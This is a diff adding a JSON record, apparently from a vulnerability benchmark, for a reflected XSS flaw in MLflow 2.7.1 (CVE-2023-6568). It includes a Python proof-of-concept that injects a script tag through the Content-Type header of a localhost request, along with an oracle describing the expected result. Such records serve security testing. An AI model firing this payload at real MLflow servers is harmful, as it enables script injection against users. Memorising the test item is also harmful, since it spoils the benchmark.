@@ -1,0 +1,15 @@
+{
+  "file_id": "187_mlflow_huntr_816bdaaa-8153-4732-951e-b0d92fddf709",
+  "numeric_id": "187",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Reflected XSS in MLflow due to unsanitized Content-Type header in error response",
+  "cve": "CVE-2023-6568",
+  "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected",
+  "library": "mlflow",
+  "affected_version": "== 2.7.1",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "from requests import post\nurl = 'http://127.0.0.1:5000/api/2.0/mlflow/users/create'\nheaders = {\n'Content-Type': '<script>alert(document.domain)</script>',\n}\nresp = post(url, headers=headers).text\nprint(resp)",
+  "oracle": "The server returns an error message containing the unescaped malicious script in the Content-Type header, which executes in the victim's browser."
+}
